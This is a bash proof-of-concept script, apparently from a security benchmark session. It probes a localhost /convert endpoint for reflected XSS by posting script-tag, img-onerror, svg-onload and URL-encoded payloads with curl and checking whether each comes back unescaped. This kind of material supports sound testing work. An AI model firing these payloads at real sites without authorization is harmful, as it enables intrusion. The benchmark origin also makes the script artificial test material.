#!/bin/bash
# POC: Demonstrates reflected XSS vulnerability in /convert endpoint markdown_text parameter through multiple payload vectors
# Target: ./repo
# Created: 2025-11-10T14:59:02.283Z
# Session: benchmark-XBEN-033-24-mht9ijkn

# Reflected XSS POC for /convert endpoint markdown_text parameter
# Target: http://localhost:8080/convert
# Vulnerability: Unescaped markdown_text input reflected in HTML response

TARGET_URL="http://localhost:8080/convert"

echo "[*] Testing Reflected XSS in markdown_text parameter"
echo "[*] Target: $TARGET_URL"
echo ""

# Test 1: Script tag payload
echo "[TEST 1] Script tag payload:"
echo "Payload: <script>alert(1)</script>"
RESPONSE1=$(curl -s -X POST "$TARGET_URL" -d "url=&markdown_text=<script>alert(1)</script>")
if echo "$RESPONSE1" | grep -q "<script>alert(1)</script>"; then
    echo "✓ VULNERABLE: Unescaped script tag found in response"
    echo "Response snippet:"
    echo "$RESPONSE1" | grep -o "<script>alert(1)</script>" | head -1
else
    echo "✗ Script tag not found in response"
fi
echo ""

# Test 2: IMG onerror payload
echo "[TEST 2] IMG onerror payload:"
echo "Payload: <img src=x onerror=alert(1)>"
RESPONSE2=$(curl -s -X POST "$TARGET_URL" -d "url=&markdown_text=<img src=x onerror=alert(1)>")
if echo "$RESPONSE2" | grep -q "<img src=x onerror=alert(1)>"; then
    echo "✓ VULNERABLE: Unescaped img tag with onerror found in response"
    echo "Response snippet:"
    echo "$RESPONSE2" | grep -o "<img src=x onerror=alert(1)>" | head -1
else
    echo "✗ IMG onerror payload not found in response"
fi
echo ""

# Test 3: SVG onload payload
echo "[TEST 3] SVG onload payload:"
echo "Payload: <svg onload=alert(1)>"
RESPONSE3=$(curl -s -X POST "$TARGET_URL" -d "url=&markdown_text=<svg onload=alert(1)>")
if echo "$RESPONSE3" | grep -q "<svg onload=alert(1)>"; then
    echo "✓ VULNERABLE: Unescaped svg tag with onload found in response"
    echo "Response snippet:"
    echo "$RESPONSE3" | grep -o "<svg onload=alert(1)>" | head -1
else
    echo "✗ SVG onload payload not found in response"
fi
echo ""

# Test 4: Alternative payload with encoded characters
echo "[TEST 4] Double-encoded payload test:"
echo "Payload: &lt;script&gt;alert(1)&lt;/script&gt;"
RESPONSE4=$(curl -s -X POST "$TARGET_URL" -d "url=&markdown_text=%3Cscript%3Ealert(1)%3C/script%3E")
if echo "$RESPONSE4" | grep -q "alert(1)"; then
    if echo "$RESPONSE4" | grep -q "&lt;" || echo "$RESPONSE4" | grep -q "&gt;"; then
        echo "✓ Payload is HTML-encoded (properly sanitized)"
    else
        echo "✓ VULNERABLE: Script injection detected in response"
    fi
else
    echo "✗ Payload not reflected in response"
fi
echo ""

echo "[*] XSS Vulnerability Assessment Complete"